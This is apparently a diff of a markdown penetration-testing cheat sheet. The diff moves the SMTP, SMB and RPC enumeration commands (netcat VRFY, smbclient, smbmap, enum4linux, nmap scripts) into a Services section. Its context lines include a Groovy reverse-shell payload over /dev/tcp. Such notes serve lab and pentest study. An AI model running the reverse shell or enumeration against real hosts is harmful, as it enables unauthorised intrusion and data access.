@@ -3,6 +3,9 @@
 * [Services](#Services)
      * [Most common ports](#Most-common-ports)
      * [Port Scanning Nmap](#port-scanning-Nmap)
+     * [SMTP](#SMTP)
+     * [SMB](#SMB)
+     * [RPC](#RPC)
 * [Web-applications](#Web-applications)
 
 ## Host Discovery
@@ -17,7 +20,7 @@ sudo netdiscover -r <RANGE>
 sudo netdisover -i <INTERFACE>
 ```
 
-## Services / Port Scanning
+## Services
 ### Most common ports
 ```
 21: ftp
@@ -75,6 +78,68 @@ If there is an open HTTP proxy, connect to it by configuring a proxy in your bro
 https://github.com/Tib3rius/AutoRecon
 ```
 autorecon -vv <IP>
+```
+
+### SMTP
+#### Enumerate emails accounts
+```
+nc -nv <IP> 25
+VRFY root
+VRFY idontexist
+Check output
+```
+
+### SMB 
+https://book.hacktricks.xyz/pentesting/pentesting-smb
+
+#### Get version script
+https://github.com/unkn-0wn/SmbVersion
+```
+sudo python3 smbver.py <IP> <PORT>
+```
+
+#### Nmap enumerate SMB shares
+```
+nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse <IP>
+```
+
+#### Enum4linux
+Gotta try this: https://github.com/cddmp/enum4linux-ng
+```
+enum4linux <IP>
+```
+
+#### SMBClient list shares
+```
+smbclient -L <IP>
+smbclient -L <IP>  -U '<USER>'%'<PASS>'
+```
+
+#### SMBClient connect to share
+```
+smbclient //<IP>/<SHARE>
+```
+
+#### Download smb files recursively
+```
+get <FILE NAME>-
+smbget -R smb://<IP>/<SHARE>
+```
+
+#### SMBMap check access
+```
+smbmap -H <IP> -p 445 -u ''
+```
+
+#### Nbtscan
+```
+nbtscan <IP>
+```
+
+### RPC
+#### Nmap enumerate RPC shares
+```
+nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount <IP>
 ```
 
 ## Web-applications
@@ -167,68 +232,6 @@ wpscan --url <URL> --usernames <USERNAME> --passwords /usr/share/wordlists/rocky
 r = Runtime.getRuntime()
 p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<IP>/<PORT>;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
 p.waitFor()
-```
-
-### SMTP
-#### Enumerate emails accounts
-```
-nc -nv <IP> 25
-VRFY root
-VRFY idontexist
-Check output
-```
-
-### SMB / SMB Shares
-https://book.hacktricks.xyz/pentesting/pentesting-smb
-
-#### Get version script
-https://github.com/unkn-0wn/SmbVersion
-```
-sudo python3 smbver.py <IP> <PORT>
-```
-
-#### Nmap enumerate SMB shares
-```
-nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse <IP>
-```
-
-#### Enum4linux
-Gotta try this: https://github.com/cddmp/enum4linux-ng
-```
-enum4linux <IP>
-```
-
-#### SMBClient list shares
-```
-smbclient -L <IP>
-smbclient -L <IP>  -U '<USER>'%'<PASS>'
-```
-
-#### SMBClient connect to share
-```
-smbclient //<IP>/<SHARE>
-```
-
-#### Download smb files recursively
-```
-get <FILE NAME>-
-smbget -R smb://<IP>/<SHARE>
-```
-
-#### SMBMap check access
-```
-smbmap -H <IP> -p 445 -u ''
-```
-
-#### Nbtscan
-```
-nbtscan <IP>
-```
-
-### Shares RPC
-#### Nmap enumerate RPC shares
-```
-nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount <IP>
 ```
 
 ### General
